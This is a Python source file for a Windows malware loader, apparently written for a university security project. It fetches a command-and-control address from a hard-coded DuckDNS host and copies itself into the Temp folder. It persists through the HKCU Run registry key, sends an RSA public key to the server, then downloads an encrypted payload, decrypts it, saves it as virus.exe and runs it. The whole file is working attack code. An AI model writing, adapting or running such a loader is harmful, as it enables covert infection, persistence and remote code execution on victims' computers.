import socket
import os
from os import listdir
from os.path import isfile, join
import subprocess
import time
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import logging
import shutil
import sys
import winreg as wrg
import requests

log = logging.getLogger(__name__)

CYPHERTEXT_LENGTH = 256
IP = "progettosicurezzaeprivacy.duckdns.org:55551/"
CCPORT = 5555
DOWLOADED_FILE_NAME = "virus"

class Cryptography:

    def __init__(self):
        self.keyPair = RSA.generate(2048)
        self.publicKeyPEM = self.keyPair.publickey().exportKey()
        self.manager = PKCS1_OAEP.new(self.keyPair)

    def decrypt(self,cyphertext):
        return self.manager.decrypt(cyphertext)

    def getPublicKey(self):
        return self.publicKeyPEM


class Communication:

    def __init__(self):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def conn(self, CCIP, CCPORT):
        try:
            self.client.connect((CCIP, CCPORT))
            log.info('connected')
        
        except Exception as e:
            log.error(e)

    def send(self, message):
        try:
            self.client.send(message)
            log.debug(f"Sending:\n {message}")

        except Exception as e:
            log.error(e)


    def receive(self, msgSize):
        try:
                while True:
                    data = self.client.recv(msgSize)
                    return data
        except Exception as e:
            log.error(e)

def getIp():
    headers = {
    'User-Agent': 'FIREF0X/117.0',

    }
    r = requests.get(IP, headers=headers)
    print(r.status_code)
    print(r.text)
    return r.text
    

def copyFile():
    log.info("copying script to another folder...")
    
    filename = "demoScript.exe"

    path = join(os.getenv('LOCALAPPDATA'),"Temp")
    
    if (not isfile(join(path, filename))):
        try:
            log.debug("copying to " + join(path, filename))
            log.debug( 'sys.argv[0] is' + sys.argv[0] )
            shutil.copyfile(sys.argv[0], join(path, filename))
        except Exception as e:
            log.error(e)
    else:
        log.debug("already there ")

def AddToRegistry():
    filename = "demoScript.exe"

    path = join(os.getenv('LOCALAPPDATA'),"Temp")
    address= join(path, filename)

    key = wrg.HKEY_CURRENT_USER
    key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try:
        open = wrg.OpenKey(key,key_value,0,wrg.KEY_ALL_ACCESS)

        wrg.SetValueEx(open,"any_name",0,wrg.REG_SZ,address)

        wrg.CloseKey(open)
    except Exception as e:
        log.error(e)

    
def saveToFile(data):
    log.info("saving file...")

    savePath = os.path.dirname(sys.argv[0])
    try: 
        with open(os.path.join(savePath, DOWLOADED_FILE_NAME+".exe"), "wb") as file1:
            log.debug(f"writing data in {savePath}")
            file1.write(data)
    except Exception as e:
        log.error(e)
    return savePath


def executePayload(savePath):
    log.info("executing payload...")
    log.debug(join(savePath, DOWLOADED_FILE_NAME+".exe"))
    subprocess.call([join(savePath, DOWLOADED_FILE_NAME+".exe")])


def main():
    logging.basicConfig( 
                        level=logging.INFO, 
                        format='%(asctime)s: %(levelname)s, %(message)s' )
    log.info("Starting")

    CCIP = getIp()

    copyFile()
    
    AddToRegistry()

    communication = Communication()
    crypto = Cryptography()
    
    

    communication.conn(CCIP, CCPORT)

    # SEND MALWARE'S PK
    log.info("sending client public key...")
    communication.send(crypto.getPublicKey())
    
    # RECEIVE ENCRYPTED MESSAGE
    log.info("waiting for payload...")
    chunks = bytearray()
    
    while True:
        encryptedChunk = communication.receive(CYPHERTEXT_LENGTH)
        chunks.extend(encryptedChunk)
        if not encryptedChunk:
            break 

    # DECRYPTING ENCRYPTED MESSAGE 
    log.info("decrypting chunks...")
    PAYLOAD = bytearray()  
    begin = 0
    end = CYPHERTEXT_LENGTH
    lenght = len(chunks)//CYPHERTEXT_LENGTH
    for i in range(lenght):  
        log.debug("decrypting: " + str(i) + "/" + str(lenght))     
        PAYLOAD.extend(crypto.decrypt(chunks[begin:end]))
        begin = end
        end = begin + CYPHERTEXT_LENGTH

    savePath = saveToFile(PAYLOAD)

    executePayload(savePath)    

    

if __name__ == "__main__":
    main()